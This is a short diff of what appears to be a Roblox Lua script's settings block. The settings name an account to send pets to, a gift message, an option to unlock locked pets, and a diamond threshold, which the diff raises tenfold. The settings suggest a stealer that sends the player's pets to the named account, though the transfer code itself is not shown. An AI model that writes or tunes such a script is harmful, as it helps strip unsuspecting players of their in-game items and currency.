@@ -6,7 +6,7 @@ _G.Username = "cocvn_my" --// Username To Send Pets To
 
 _G.GiftMessage = "hi" --// Message For The Gift To Say
 
-_G.Diamonds = 100000 --// Amount Of Diamonds To Not Kick
+_G.Diamonds = 1000000 --// Amount Of Diamonds To Not Kick
 
 _G.UnlockPets = true --// Unlocks Locked Pets
 
